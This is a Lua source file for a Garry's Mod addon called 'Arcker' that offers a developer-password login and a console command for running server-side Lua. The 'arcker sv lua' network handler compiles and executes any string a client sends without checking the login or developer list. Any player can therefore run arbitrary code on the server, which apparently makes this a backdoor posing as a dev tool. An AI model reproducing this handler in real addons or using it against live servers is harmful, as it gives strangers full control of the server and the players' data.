if SERVER then
	util.AddNetworkString( 'arcker login' )
	util.AddNetworkString( 'arcker sv lua' )
	
	local Chr = string.Explode( '', '0123456789abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ#$%*&', false )
	function Arcker.MakePW()
		local Ret = ''
		for i = 0, 64 do
			Ret = Ret .. table.Random( Chr )
		end
		return Ret
	end
	Arcker.DevPW = CreateConVar( 'arcker_devpw', Arcker.MakePW(), { FCVAR_ARCHIVE, FCVAR_SERVER_CAN_EXECUTE, FCVAR_PROTECTED }, 'Arcker\'s developer password')
	Arcker.Devs = {}
	Arcker.LoginDelay = {}
	
	net.Receive( 'arcker login', function( len, ply )
		if Arcker.LoginDelay[ply] then return end
		local PlyPW = net.ReadString()
		if Arcker.DevPW:GetString() == PlyPW then
			print( string.format( "%s(%s) logged in as a Developer.", ply:GetName(), ply:SteamID() ) )
			Arcker.Print( ply, Arcker.PRINTCONSOLE, Color( 0, 255, 0 ), "Logged in as developer!" ) 
			ply:SetNWBool( "ArckerDev", true )
			Arcker.Devs[ply] = true
		else
			Arcker.Print( ply, Arcker.PRINTCONSOLE, Color( 255, 0, 0 ), "Login attempt failed" )
		end
		Arcker.LoginDelay[ply] = true
		timer.Simple( 5, function() Arcker.LoginDelay[ply] = nil end )
	end )
	
	net.Receive( 'arcker sv lua', function( len, ply )
		local s = string.sub( net.ReadString(), 4 )
		local function run( )
			local print = function( ... ) Arcker.Print( ply, 1, ... ) end 
			local func = CompileString( s, string.format( '%s(%s)\'s lua run', ply:GetName(), ply:SteamID() ), false )
			local ran, ret = pcall( func )
			print = nil
			if ran then
				Arcker.Print( ply, 1, Color( 0, 255, 0 ), '=' , tostring( ret ) )
			else
				Arcker.Print( ply, 1, Color( 255, 0, 0 ), tostring( ret ) )
			end
		end
		run()
	end	)
end

if CLIENT then
	Arcker.CanLogin = true
end

Arcker.ConCommands = {
	['login'] = function( ply, cmd, args, raw )
		if SERVER then return end
		if args[2] == nil or args[2] == "" then return end
		if not Arcker.CanLogin then MsgC( Color( 255, 255, 0 ), "Please wait before trying to login again...\n" ) return end
		if ply:GetNWBool( "ArckerDev" ) then MsgC( Color( 255, 255, 0 ), "Already logged in.\n" ) return end
		Arcker.CanLogin = false
		timer.Simple( 5, function() Arcker.CanLogin = true end )
		net.Start( 'arcker login' )
		net.WriteString( args[2] )
		net.SendToServer()
	end,
	['sl'] = function( ply, cmd, args, raw )
		net.Start( 'arcker sv lua' )
		net.WriteString( raw )
		net.SendToServer()
	end
}

concommand.Add( 'arcker', function( ply, cmd, args, raw ) 
	if not ply then return end
	if #args == 0 then
		print( Arcker.Name .. ' - Version: ' .. Arcker.Version )
		return nil
	end
	if Arcker.ConCommands[args[1]] ~= nil then
		Arcker.ConCommands[args[1]]( ply, cmd, args, raw )
	end
end )